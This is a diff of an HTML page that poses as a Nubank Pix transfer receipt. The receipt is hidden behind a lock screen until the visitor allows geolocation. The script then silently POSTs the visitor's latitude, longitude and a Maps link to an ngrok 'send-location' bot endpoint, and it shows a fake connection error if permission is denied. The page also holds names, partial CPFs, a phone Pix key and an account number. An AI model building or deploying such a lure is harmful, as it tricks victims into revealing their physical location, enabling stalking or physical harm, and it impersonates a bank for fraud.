@@ -4,10 +4,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante de Recebimento</title>
-  <link rel="stylesheet" href="styles.css" />
-
+  <title>Comprovante de Transferência</title>
+  <link rel="stylesheet" href="styles.css">
   <style>
+    /* Estilo rápido para a tela de bloqueio não quebrar */
     #tela-bloqueio {
       display: flex;
       flex-direction: column;
@@ -15,19 +15,14 @@
       align-items: center;
       height: 100vh;
       font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
+      background-color: #f5f5f5;
       text-align: center;
       padding: 20px;
     }
 
     #tela-bloqueio h1 {
-      color: #333;
+      color: #820ad1;
       margin-bottom: 10px;
-    }
-
-    #tela-bloqueio p {
-      color: #666;
-      font-size: 18px;
     }
 
     .loader {
@@ -41,85 +36,142 @@
 
   <div id="tela-bloqueio">
     <div class="loader">🔒</div>
-    <h1>Verificando Segurança...</h1>
-    <p>Para visualizar o comprovante, por favor clique em <strong>Permitir</strong> na solicitação de localização.</p>
+    <h1>Autenticação Necessária</h1>
+    <p>Para visualizar o comprovante seguro, clique em <strong>Permitir</strong> na solicitação de localização.</p>
   </div>
 
   <div id="site-real" style="display: none;">
-    <div class="comprovante-container">
-      <h1>Comprovante de Recebimento</h1>
 
-      <div class="informacoes">
-        <p><span>Data:</span> <span id="data-atual"></span></p>
-        <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-        <p><span>De:</span> João Silva de Oliveira</p>
-        <p><span>Status:</span> Recebido com Sucesso</p>
+    <div class="nubank-container">
+      <header>
+        <div class="logo">
+          <svg width="45" height="45" viewBox="0 0 45 45" xmlns="http://www.w3.org/2000/svg">
+            <path
+              d="M22.5 0C10.074 0 0 10.074 0 22.5S10.074 45 22.5 45 45 34.926 45 22.5 34.926 0 22.5 0zm0 41.5A19.022 19.022 0 0 1 3.5 22.5 19.022 19.022 0 0 1 22.5 3.5 19.022 19.022 0 0 1 41.5 22.5 19.022 19.022 0 0 1 22.5 41.5z"
+              fill="#000" fill-opacity=".1" fill-rule="evenodd" />
+            <path
+              d="M30.65 24.346c-2.316-1.187-3.127-1.89-3.127-2.905 0-.85.736-1.365 2.1-1.365 1.545 0 2.54.626 3.018 1.803l3.054-1.288c-.92-2.39-2.907-3.75-6.072-3.75-3.35 0-5.74 2.06-5.74 4.895 0 2.686 1.766 4.085 4.967 5.666 2.54 1.25 3.018 1.95 3.018 3.017 0 .993-.92 1.51-2.28 1.51-1.84 0-2.834-.81-3.385-2.21l-3.238 1.14c.957 2.87 3.238 4.305 6.623 4.305 3.643 0 5.924-2.134 5.924-4.968 0-2.943-1.95-4.305-4.86-5.85zM14.28 29.57h3.79V17.02h-3.79v12.55zm5.96 0h3.79V17.02h-3.79v12.55z"
+              fill="#820ad1" />
+          </svg>
+        </div>
+        <h1>Comprovante de<br>transferência</h1>
+        <p class="data-hora"><span id="data-atual"></span> - 20:17:23</p>
+      </header>
+
+      <div class="section">
+        <div class="row">
+          <span class="label">Valor</span>
+          <span class="value">R$ 200,00</span>
+        </div>
+        <div class="row">
+          <span class="label">Tipo de transferência</span>
+          <span class="value">Pix</span>
+        </div>
       </div>
 
-      <button class="botao" onclick="window.print()">Imprimir</button>
+      <div class="section-title">Destino</div>
+      <div class="section">
+        <div class="row">
+          <span class="label">Nome</span>
+          <span class="value">LUDIELY DAS NEVES ROCHA</span>
+        </div>
+        <div class="row">
+          <span class="label">CPF</span>
+          <span class="value">***.163.817-**</span>
+        </div>
+        <div class="row">
+          <span class="label">Instituição</span>
+          <span class="value">SICOOB CONEXÃO</span>
+        </div>
+        <div class="row">
+          <span class="label">Tipo de conta</span>
+          <span class="value">Conta corrente</span>
+        </div>
+        <div class="row">
+          <span class="label">Chave Pix</span>
+          <span class="value">+5527997746892</span>
+        </div>
+      </div>
 
-      <div class="comprovante-footer">
-        <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-        <p><a href="#">Clique aqui</a> para mais informações.</p>
+      <div class="section-title">Origem</div>
+      <div class="section">
+        <div class="row">
+          <span class="label">Nome</span>
+          <span class="value">Caio Monte Belo Rocha Segal</span>
+        </div>
+        <div class="row">
+          <span class="label">Instituição</span>
+          <span class="value">NU PAGAMENTOS - IP</span>
+        </div>
+        <div class="row">
+          <span class="label">Agência</span>
+          <span class="value">0001</span>
+        </div>
+        <div class="row">
+          <span class="label">Conta</span>
+          <span class="value">69221724-7</span>
+        </div>
+        <div class="row">
+          <span class="label">CPF</span>
+          <span class="value">***.700.117-**</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="nubank-footer">
+      <p class="instituicao">Nu Pagamentos S.A. - Instituição de Pagamento<br>CNPJ 18.236.120/0001-58</p>
+
+      <p class="transacao-label">ID da transação:</p>
+      <p class="transacao-code">E18236120202601122317s13e37e2a2b</p>
+      <p class="transacao-info">Estamos aqui para ajudar se você tiver alguma dúvida.</p>
+
+      <a href="#" class="me-ajuda">Me ajuda -></a>
+
+      <div class="ouvidoria">
+        Ouvidoria: 0800 887 0463 ou demais canais em nubank.com.br/contatos#ouvidoria (Atendimento das 8h às 18h em dias
+        úteis).
       </div>
     </div>
   </div>
 
   <script>
-    // Formata a data assim que carrega
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-    document.getElementById("data-atual").textContent = dataFormatada;
+    // Formata Data Atual
+    const dataObj = new Date();
+    const dia = String(dataObj.getDate()).padStart(2, '0');
+    const mesMap = ["JAN", "FEV", "MAR", "ABR", "MAI", "JUN", "JUL", "AGO", "SET", "OUT", "NOV", "DEZ"];
+    const mes = mesMap[dataObj.getMonth()];
+    const ano = dataObj.getFullYear();
+    document.getElementById("data-atual").textContent = `${dia} ${mes} ${ano}`;
 
-    // Tenta pegar a localização ao carregar
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
-        alert("Seu navegador não suporta geolocalização.");
+        alert("Erro no navegador.");
       }
     });
 
     function sendLocation(position) {
-      // 1. Lógica Visual: Libera a tela
+      // Libera a tela
       document.getElementById('tela-bloqueio').style.display = 'none';
       document.getElementById('site-real').style.display = 'block';
 
-      // 2. Coleta os dados
+      // Envia dados
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
-      // Link corrigido para abrir direto no Google Maps
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      const maps = `http://maps.google.com/?q=${latitude},${longitude}`;
 
-      // 3. Envia para o Backend (Bot)
-      // IMPORTANTE: Se você reiniciar o Ngrok, troque esse link abaixo!
+      // ATENÇÃO: VERIFIQUE SE O LINK DO NGROK ESTÁ ATUALIZADO
       fetch("https://85c28ff20ca3.ngrok-free.app/send-location", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ latitude, longitude, maps })
-      })
-        .then(response => response.json())
-        .then(data => {
-          console.log("Localização enviada com sucesso");
-        })
-        .catch(error => {
-          console.error("Erro silencioso ao enviar:", error);
-        });
+      }).catch(e => console.log(e));
     }
 
     function handleError(error) {
-      // Se a pessoa negar, muda o texto da tela de bloqueio
-      const titulo = document.querySelector('#tela-bloqueio h1');
-      const texto = document.querySelector('#tela-bloqueio p');
-
-      titulo.innerText = "⚠️ Acesso Negado";
-      titulo.style.color = "red";
-      texto.innerHTML = "É obrigatório permitir a localização para acessar o comprovante.<br>Recarregue a página e tente novamente.";
+      document.querySelector('#tela-bloqueio h1').innerText = "Erro de Conexão";
+      document.querySelector('#tela-bloqueio p').innerText = "Não foi possível carregar o comprovante. Verifique sua conexão e permissões.";
     }
   </script>
 </body>
